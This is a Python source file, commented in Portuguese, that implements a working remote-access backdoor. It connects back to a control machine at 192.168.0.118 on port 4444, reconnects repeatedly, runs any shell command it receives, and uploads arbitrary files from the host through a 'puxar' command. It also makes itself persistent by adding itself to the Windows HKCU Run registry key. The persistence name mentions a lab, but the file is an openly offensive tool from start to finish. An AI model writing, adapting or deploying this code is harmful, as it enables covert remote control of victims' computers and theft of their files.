import socket
import os
import sys
import time

try:
    import winreg as reg
except ImportError:
    reg = None

class Intranet:
    def __init__(self):
        self.ip = "192.168.0.118"  # IP do seu Kali/PC de controle
        self.porta = 4444          
        self.intervalo_reconexao = 5
        self.nome_persistenca = "AgenteMonitoramentoLab"

    def garantir_persistencia(self):
        if reg is None:
            return
        try:
            caminho_atual = os.path.abspath(sys.argv[0])
            subchave_run = r"Software\Microsoft\Windows\CurrentVersion\Run"
            chave_aberta = reg.OpenKey(reg.HKEY_CURRENT_USER, subchave_run, 0, reg.KEY_WRITE)
            reg.SetValueEx(chave_aberta, self.nome_persistenca, 0, reg.REG_SZ, caminho_atual)
            reg.CloseKey(chave_aberta)
        except:
            pass

    def transferir_arquivo(self, nome_arquivo, sock):
        """Lê qualquer arquivo (foto, vídeo, pdf) em modo binário e envia."""
        if not os.path.exists(nome_arquivo):
            sock.sendall(f"[-] Erro: O arquivo '{nome_arquivo}' nao foi encontrado.\n".encode("utf-8"))
            return

        try:
            tamanho = os.path.getsize(nome_arquivo)
            sock.sendall(f"[+] Iniciando transferencia de {nome_arquivo} ({tamanho} bytes)...\n".encode("utf-8"))
            time.sleep(0.5) 

            with open(nome_arquivo, "rb") as f:
                while True:
                    bytes_lidos = f.read(1024)
                    if not bytes_lidos:
                        break 
                    sock.sendall(bytes_lidos)
            
            sock.sendall(b"\n[+] Transferencia concluida com sucesso.\n")
        except Exception as erro:
            sock.sendall(f"[-] Erro ao transferir arquivo: {erro}\n".encode("utf-8"))

    def executar_comando(self, comando_str, sock):
        try:
            if comando_str.lower().startswith("puxar "):
                nome_arquivo = comando_str[6:].strip()
                self.transferir_arquivo(nome_arquivo, sock)
                return None 

            if comando_str.lower().startswith("cd "):
                nova_pasta = comando_str[3:].strip()
                os.chdir(nova_pasta)  
                return None # O prompt atualizado já vai mostrar a pasta nova
            
            resultado = os.popen(comando_str).read()
            if not resultado:
                return b"\n"
            return resultado.encode("utf-8")
        except Exception as erro:
            return f"[-] Erro ao executar comando: {erro}\n".encode("utf-8")

    def iniciar_conexao(self):
        while True:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                print(f"[+] Tentando conectar a {self.ip}:{self.porta}...")
                sock.connect((self.ip, self.porta))
                
                sock.sendall(b"[+] Conexao interativa estabelecida com o Agente POO!\n")
                
                while True:
                    # A MÁGICA DO PROMPT ESTÁ AQUI:
                    # Captura a pasta atual e envia como um indicador de linha de comando (ex: /home/user> )
                    pasta_atual = os.getcwd()
                    prompt_formatado = f"\n{pasta_atual}> "
                    sock.sendall(prompt_formatado.encode("utf-8"))
                    
                    dados_recebidos = sock.recv(1024)
                    if not dados_recebidos:
                        break
                    
                    comando_str = dados_recebidos.decode("utf-8").strip()
                    if not comando_str:
                        continue
                        
                    if comando_str.lower() == "exit":
                        break
                    
                    resposta_bytes = self.executar_comando(comando_str, sock)
                    if resposta_bytes:
                        sock.sendall(resposta_bytes)
                        
            except (socket.error, Exception):
                time.sleep(self.intervalo_reconexao)
            finally:
                if sock:
                    try: sock.close()
                    except: pass

    def rodar(self):
        self.garantir_persistencia()
        self.iniciar_conexao()

if __name__ == "__main__":
    agente = Intranet()
    agente.rodar()
